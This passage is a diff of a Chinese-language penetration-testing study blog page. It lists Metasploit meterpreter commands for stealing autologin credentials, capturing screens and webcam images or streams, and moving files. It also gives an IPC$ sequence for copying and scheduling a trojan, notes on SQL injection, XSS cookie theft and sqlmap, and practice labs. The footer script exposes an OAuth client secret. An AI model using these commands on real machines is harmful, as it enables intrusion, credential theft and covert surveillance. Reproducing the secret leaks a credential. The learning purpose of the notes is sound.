class="comment">#列举安装在目标机上的程序</span></span><br><span class="line"></span><br><span class="line">如果有用户将计算机设置为自动登录，下面这个命令用来抓取自动登录的用户名和密码</span><br><span class="line">run windows/gather/credentials/windows_autologin <span class="comment">#如果没抓到，往下看</span></span><br><span class="line">load espia</span><br><span class="line">screengrab/screenshot <span class="comment">#抓取此时目标机的屏幕截图</span></span><br><span class="line"><span class="comment">#还有些拓展 webcam_list 查看目标机有无摄像头</span></span><br><span class="line"><span class="comment"># webcam_snap打开目标机摄像头，拍张照片</span></span><br><span class="line"><span class="comment"># webcam_stream 开启直播模式</span></span><br><span class="line"><span class="comment"># 还可以输入shell进入目标机shell，即终端吧，exit回到metasploit会话</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>3.文件系统命令</strong></p>
+<p>搜索文件并执行各种任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.<span class="built_in">pwd</span>/getwd <span class="comment">#查看当前处于目标机的哪个目录</span></span><br><span class="line">2.<span class="built_in">ls</span></span><br><span class="line">3.<span class="built_in">cd</span></span><br><span class="line">4.search -f *.txt -d c:\ <span class="comment">#搜索c盘中所有以&quot;.txt&quot;为扩展的文件</span></span><br><span class="line">5.download c: \test.txt /root <span class="comment">#将目标机C盘的test.txt下载到攻击机root下</span></span><br><span class="line">6.upload /root/test.txt c:\ <span class="comment">#上传攻击机root目录下的test.txt文件到目标机C盘下</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>没有管理员权限，就获取不到Hash、安装软件、修改防火墙&#x2F;注册表规则</p>
+<p>所以目标权限就是 Guest-&gt;User-&gt;Administrator-&gt;System</p>
+<p>纵向提权或横向提权，类似于越权的说法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="comment">#进入命令行</span></span><br><span class="line"><span class="built_in">whoami</span> /groups <span class="comment">#查看我们当前的权限 以标准用户为例吧，提权到管理员</span></span><br></pre></td></tr></table></figure>
+
+<p>利用本地溢出漏洞，把用户从User组或其他组提升到管理员组</p>
+<blockquote>
+<p><strong>溢出：</strong>就是指用户输入的数据超过程序预先设定好的缓存区长度，程序会溢出</p>
+</blockquote>
+<h5 id="利用WMIC"><a href="#利用WMIC" class="headerlink" title="利用WMIC"></a>利用WMIC</h5><p>后门</p>
+<p><strong>内网攻击域渗透</strong></p>
+<p>拿到webshell-&gt;提权</p>
+<p>提权失败，继续渗透</p>
+<blockquote>
+<p>添加内网路由，弱口令扫描</p>
+<p>powershell对内网扫描</p>
+<p>假设socks4a，socks会自动内网扫描</p>
+<p>其他</p>
+</blockquote>
+<p><strong>IPC$渗透</strong></p>
+<p>使用windwos系统中默认启动的IPC$共享获得计算机控制权的入侵</p>
+<p>假设有一台IPC$主机127.0.0.25</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.25\ipc$ <span class="comment">#连接127.0.0.25的ipc$共享</span></span><br><span class="line">copy srv.exe \\127.0.0.25\ipc$ <span class="comment">#复制exe到目标主机</span></span><br><span class="line">net time \\127.0.0.25\ipc$ <span class="comment">#查时间</span></span><br><span class="line">at \\127.0.0.25 10:50 ipc$ <span class="comment">#在10:50启动 现在at已经换了，到时候cmd会提示的</span></span><br></pre></td></tr></table></figure>
+
+<p>以上就是ipc$用法</p>
+<p>实际渗透的时候，可以将<strong>免杀后的payload</strong> copy过去</p>
+<p>然后使用at命令启动木马</p>
+<p>返回handler监听，</p>
+<h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了以下5种独特的SQL注入技术。</p>
 <p>● 基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入。</p>
 <p>● 基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行（即页面返回时间是否增加）来判断。</p>
 <p>● 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</p>
 <p>● 联合查询注入，在可以使用Union的情况下的注入。</p>
 <p>● 堆查询注入，可以同时执行多条语句时的注入。</p>
-<h3 id="3-漏洞发现"><a href="#3-漏洞发现" class="headerlink" title="3.漏洞发现"></a>3.漏洞发现</h3><p>传统漏洞</p>
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>传统漏洞</p>
 <p>框架组件公开漏洞</p>
 <p>口令漏洞</p>
 <p>代码审计0day</p>
-<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
-<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
+<h4 id="xss-1"><a href="#xss-1" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230603172605460.png"></p>
 <h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>linux系统LANMP、vulhub</p>
 <p>Windows系统WAMP</p>
@@ -274,6 +537,7 @@
 <p>sql-labs</p>
 <p>xss-labs</p>
 <p>pikachu</p>
+<p>dorabox</p>
 </blockquote>
 <p>还有在线靶场如hack the box</p>
  
@@ -345,7 +609,7 @@
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag">web漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E6%9E%9A%E4%B8%BE/" rel="tag">端口枚举</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/" rel="tag">谷歌语法</a></li></ul>
 
     </footer>
   </div>
@@ -372,6 +636,32 @@
 
   
    
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk-Yuleiyun# Repository name',
+    owner: 'ak005469075# GitHub ID',
+    admin: ['ak005469075# GitHub ID'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
   
    
     <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
